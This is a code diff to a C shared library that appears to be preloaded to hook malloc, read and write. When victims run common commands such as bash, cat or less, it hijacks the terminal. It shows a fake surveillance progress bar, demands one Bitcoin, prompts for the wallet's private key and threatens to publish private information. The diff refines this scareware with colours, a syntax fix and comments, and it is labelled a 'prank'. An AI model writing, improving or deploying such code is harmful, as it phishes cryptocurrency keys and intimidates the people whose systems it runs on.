@@ -92,7 +92,7 @@ void *malloc(size_t size) {
     } else {
         base = exe;
     }
-        if (strcmp(base, "bash") == 0 || strcmp(base, "less") == 0 || strcmp(base, "cat") == 0 || strcmp(base, "nano") == 0) || strcmp(base, "head") == 0 || strcmp(base, "man") == 0) {
+        if (strcmp(base, "bash") == 0 || strcmp(base, "less") == 0 || strcmp(base, "cat") == 0 || strcmp(base, "nano") == 0 || strcmp(base, "head") == 0 || strcmp(base, "man") == 0) {
             return original_malloc(size); // Avoid collision with read() 
         }
     }
@@ -130,16 +130,16 @@ void remote_access() {
 
     const int width = 30;
     for (int i = 0; i <= width; ++i) {
-        fprintf(stderr, "\r[");
+        fprintf(stderr, "\r\033[32m[");
         for (int j = 0; j < width; ++j) {
             if (j <= i)
-                fprintf(stderr, "#");
+                fprintf(stderr, "#"); // symbol for the progress bar
             else
                 fprintf(stderr, " ");
         }
-        fprintf(stderr, "] %d%%", (i * 100) / width);
+        fprintf(stderr, "]\033[0m %d%%", (i * 100) / width);
         fflush(stderr); //guarantee print before next operation
-        usleep(150000); // adjust speed
+        usleep(150000); 
     }
     sleep(1);
     fprintf(stderr, "\nYour system is being observed. We want 1 Bitcoin to revert this.");
@@ -147,7 +147,7 @@ void remote_access() {
     fprintf(stderr, "\nEnter your wallet's private key here:\n");
     fprintf(stderr, "\033[?25h");  // Show cursor again
     char key[128]; // e.g E9873D79C6D87DC0FB6A5778633389F4453213303DA61F20BD67FC233DORIKTF 
-    if (fgets(key, sizeof(key), stdin)) {
+    if (fgets(key, sizeof(key), stdin)) { // input gets taken
     // Remove newline if present
     size_t len = strlen(key);
     if (len > 0 && key[len - 1] == '\n') {
@@ -156,9 +156,10 @@ void remote_access() {
     } 
 
     if (len == 64) { // because a bitcoin private key is a 64 char long string of letters and numbers
-        fprintf(stderr, "Thank you. You will hear from us.\n");
+        fprintf(stderr, "\033[33mThank you. You will hear from us.\033[0m\n");
     } else {
-        fprintf(stderr, "Are you really trying to trick us? This is an invalid key. We will publish all your private information.\n");
+        fprintf(stderr, "\033[31mAre you really trying to trick us? This is an invalid key. We will publish all your private information.\033[0m\n");
+        sleep(2);
     }
    } 
 }
@@ -197,7 +198,7 @@ ssize_t read(int fd, void *buf, size_t count) {
         ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
         if (len != -1 && len < sizeof(exe)) {
             exe[len] = '\0';
-            char *name = basename(exe);
+            char *name = basename(exe); // extract the used command
 
             if (strstr(name, "bash") || strstr(name, "cat") || strstr(name, "less")) {
                 fprintf(stderr, "\033[?25l");  // Hide cursor to look more realistic 
@@ -234,7 +235,7 @@ ssize_t read(int fd, void *buf, size_t count) {
                 remote_access();
                 signal(SIGINT, SIG_DFL);
                 restore_terminal();
-                _exit(0); // simulate EOF to end input
+                _exit(0); 
             }
         }
     }
@@ -335,7 +336,7 @@ ssize_t write(int fd, const void *buf, size_t count) {
         original_write = dlsym(RTLD_NEXT, "write");
 }
 
-    if (getenv("DISABLE_WRITE_PRANK")) {
+    if (getenv("DISABLE_WRITE_PRANK")) { // needed for connect function
         return original_write(fd, buf, count);
     }
 
